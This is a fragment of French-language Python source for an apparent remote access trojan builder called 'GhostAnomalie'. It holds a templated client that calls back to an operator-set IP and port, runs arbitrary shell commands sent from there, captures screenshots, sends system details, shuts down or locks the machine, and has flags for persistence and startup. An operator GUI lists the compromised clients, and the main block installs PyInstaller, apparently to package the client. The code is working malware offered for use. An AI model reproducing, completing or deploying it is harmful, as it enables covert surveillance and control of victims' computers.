            return self.cmd_sysinfo()
        elif cmd == "shutdown":
            return self.cmd_shutdown()
        elif cmd == "restart":
            return self.cmd_restart()
        elif cmd == "lock":
            return self.cmd_lock()
        elif cmd == "ls":
            chemin = parts[1] if len(parts) > 1 else "."
            return self.cmd_ls(chemin)
        elif cmd == "cd":
            try:
                if len(parts) > 1:
                    os.chdir(parts[1])
                return "Dossier: " + os.getcwd()
            except Exception as e:
                return "Erreur: " + str(e)
        elif cmd == "pwd":
            return os.getcwd()
        elif cmd == "exit":
            return "EXIT"
        else:
            return self.cmd_systeme(commande)

    def cmd_screenshot(self):
        try:
            if not PIL_OK:
                return "PIL non installe"
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            return base64.b64encode(buffer.getvalue()).decode()
        except Exception as e:
            return "Erreur: " + str(e)

    def cmd_sysinfo(self):
        try:
            info = {
                "machine": self.nom_machine,
                "utilisateur": self.utilisateur,
                "systeme": platform.system(),
                "version": platform.version()
            }
            return json.dumps(info)
        except Exception as e:
            return "Erreur: " + str(e)

    def cmd_shutdown(self):
        try:
            os.system("shutdown /s /t 0")
            return "Arret du PC"
        except:
            return "Erreur"

    def cmd_restart(self):
        try:
            os.system("shutdown /r /t 0")
            return "Redemarrage du PC"
        except:
            return "Erreur"

    def cmd_lock(self):
        try:
            if WIN32_OK:
                ctypes.windll.user32.LockWorkStation()
                return "Ecran verrouille"
            return "Win32 non disponible"
        except:
            return "Erreur"

    def cmd_ls(self, chemin):
        try:
            result = []
            for item in os.listdir(chemin)[:50]:
                chemin_complet = os.path.join(chemin, item)
                if os.path.isdir(chemin_complet):
                    result.append("📁 " + item + "/")
                else:
                    taille = os.path.getsize(chemin_complet)
                    result.append("📄 " + item + " (" + str(taille) + " octets)")
            return "\n".join(result) if result else "Dossier vide"
        except Exception as e:
            return "Erreur: " + str(e)

    def cmd_systeme(self, commande):
        try:
            result = subprocess.run(commande, shell=True, 
                                  capture_output=True, text=True, timeout=10)
            return result.stdout + result.stderr
        except Exception as e:
            return "Erreur: " + str(e)

    def boucle(self):
        while self.running:
            try:
                if not self.connected:
                    if self.connecter():
                        self.connected = True
                        print("Connecte a " + IP_SERVEUR + ":" + str(PORT))
                    else:
                        time.sleep(30)
                        continue

                commande = self.client.recv(8192).decode()
                if not commande:
                    self.connected = False
                    continue

                resultat = self.executer_commande(commande)

                if resultat == "EXIT":
                    self.client.send(b"DISCONNECT")
                    self.connected = False
                    continue

                self.client.send(("RESULTAT|" + resultat).encode())

            except:
                self.connected = False
                time.sleep(5)

if __name__ == "__main__":
    client = GhostClient()
    client.boucle()
'''.format(
    nom_fichier=nom_fichier,
    ip=ip,
    port=port,
    mdp=mdp,
    nom_client=nom_client,
    persist=str(persist).lower(),
    startup=str(startup).lower()
)

    # ============================================================
    # INTERFACE - MISE À JOUR
    # ============================================================

    def mettre_a_jour_interface(self):
        self.clients_listbox.delete(0, tk.END)
        for addr, info in self.clients.items():
            nom = info.get('nom', 'Inconnu')
            ip = info.get('ip', '0.0.0.0')
            self.clients_listbox.insert(tk.END, nom + " (" + ip + ")")

        nb = len(self.clients)
        self.status_clients.config(text="👥 " + str(nb) + " clients")

        if nb > 0:
            self.status_header.config(text="🟢 " + str(nb) + " clients", fg='#00ff88')
        else:
            if self.running:
                self.status_header.config(text="🟡 En attente...", fg='#ffaa00')

        self.window.after(2000, self.mettre_a_jour_interface)

    def demarrer(self):
        self.window.mainloop()

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    try:
        import PIL
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "pillow"])

    try:
        import PyInstaller
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])

    app = GhostAnomalie()
    app.demarrer()